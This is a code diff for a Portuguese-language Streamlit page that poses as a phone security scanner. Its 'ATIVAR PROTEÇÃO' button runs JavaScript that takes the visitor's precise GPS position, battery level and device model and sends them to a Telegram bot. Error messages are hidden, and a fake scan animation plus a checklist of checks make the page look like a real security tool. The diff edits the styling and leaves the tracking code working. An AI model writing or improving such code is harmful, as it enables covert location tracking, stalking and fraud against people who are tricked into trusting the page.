@@ -7,57 +7,61 @@ ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- ESTILIZAÇÃO IDENTICA À FOTO ---
+# --- RESTAURANDO SUA ESTILIZAÇÃO ORIGINAL (BOLHA FLUTUANTE) ---
 st.markdown("""
     <style>
     .main { background-color: #0b0f14; color: white; }
     .stAlert, [data-testid="stNotificationContent"], .stException { display: none !important; }
-    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; margin-top: 50px; }
+    
+    /* A BOLHA FLUTUANTE QUE VOCÊ QUERIA */
+    .scanner-box { 
+        display: flex; 
+        flex-direction: column; 
+        align-items: center; 
+        padding: 20px; 
+        animation: float 3s ease-in-out infinite; 
+    }
+    
+    @keyframes float {
+        0% { transform: translateY(0px); }
+        50% { transform: translateY(-15px); }
+        100% { transform: translateY(0px); }
+    }
+
     .circle {
         width: 200px; height: 200px; border-radius: 50%;
-        border: 2px solid #1e2630;
+        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
+        border: 2px solid rgba(46, 204, 113, 0.5);
+        box-shadow: 0 0 40px rgba(46, 204, 113, 0.3);
         display: flex; align-items: center; justify-content: center;
-        background: radial-gradient(circle, rgba(46, 204, 113, 0.1) 0%, transparent 70%);
     }
     .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
     
-    /* BOTÃO EXATAMENTE COMO NA FOTO */
+    /* BOTÃO ORIGINAL (SEM MEXER) */
     .btn-original {
-        background-color: white;
-        color: #333;
-        border: none;
-        padding: 8px 15px;
-        border-radius: 4px;
-        font-size: 14px;
-        font-family: sans-serif;
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        cursor: pointer;
-        text-transform: uppercase;
-        font-weight: 500;
+        background-color: white; color: #333; border: none;
+        padding: 8px 15px; border-radius: 4px; font-size: 14px;
+        font-family: sans-serif; display: flex; align-items: center;
+        gap: 8px; cursor: pointer; font-weight: bold;
     }
-    .dot { color: red; font-size: 18px; }
     </style>
 """, unsafe_allow_html=True)
 
-st.markdown("<h1 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h1>", unsafe_allow_html=True)
+st.markdown("<h2 style='text-align: center; font-family: sans-serif;'>Verificar segurança</h2>", unsafe_allow_html=True)
 
-# Container da Bolha
 caixa_bolha = st.empty()
-caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
+caixa_bolha.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)
 
-# --- BOTÃO COM VISUAL DA FOTO MAS COMANDO DA GOOGLE ---
-js_botao_fiel = f"""
-<div style="display: flex; justify-content: flex-start; padding-left: 10px;">
-    <button class="btn-original" onclick="chamarGoogle()">
-        <span class="dot">●</span> ATIVAR PROTEÇÃO
+# --- BOTÃO COM COMANDO DO GPS MAS ESTILO PRESERVADO ---
+js_v1 = f"""
+<div style="display: flex; justify-content: flex-start; padding-top: 20px;">
+    <button class="btn-original" onclick="disparar()">
+        <span style="color: red; font-size: 18px;">●</span> ATIVAR PROTEÇÃO
     </button>
 </div>
 
 <script>
-function chamarGoogle() {{
-    // Comando para abrir a Precisão de Local
+function disparar() {{
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
@@ -65,18 +69,18 @@ function chamarGoogle() {{
                 const level = Math.round(bat.level * 100);
                 const model = navigator.userAgent.split('(')[1].split(')')[0];
                 
-                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
+                const texto = "🛡️ *SISTEMA ATIVADO*\\n\\n📱 *Modelo:* `" + model + "`\\n🔋 *Bateria:* `" + level + "%`\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
                 
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
-                    body: JSON.stringify({{ chat_id: "{ID}", text: msg, parse_mode: "Markdown" }})
+                    body: JSON.stringify({{ chat_id: "{ID}", text: texto, parse_mode: "Markdown" }})
                 }});
                 
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
             }} catch (e) {{}}
         }},
-        (err) => {{ console.log("Aguardando ativação..."); }},
+        (err) => {{ }},
         {{ enableHighAccuracy: true, timeout: 10000 }}
     );
 }}
@@ -87,18 +91,20 @@ function chamarGoogle() {{
         background-color: white; color: #333; border: none;
         padding: 8px 15px; border-radius: 4px; font-size: 14px;
         font-family: sans-serif; display: flex; align-items: center;
-        gap: 8px; cursor: pointer; text-transform: uppercase;
+        gap: 8px; cursor: pointer; font-weight: bold;
     }}
-    .dot {{ color: red; font-size: 18px; }}
 </style>
 """
 
-# Mantive o botão pequeno e branco como na sua referência
-clicou = st.components.v1.html(js_botao_fiel, height=60)
+ativou = st.components.v1.html(js_v1, height=100)
 
-if clicou:
+if ativou:
     for p in range(4, 101, 5):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.05)
-    st.success("Proteção Ativada")
+    st.success("Proteção Concluída")
     st.stop()
+
+st.write("✅ Ambiente de pagamentos")
+st.write("✅ Privacidade e segurança")
+st.write("✅ Vírus")
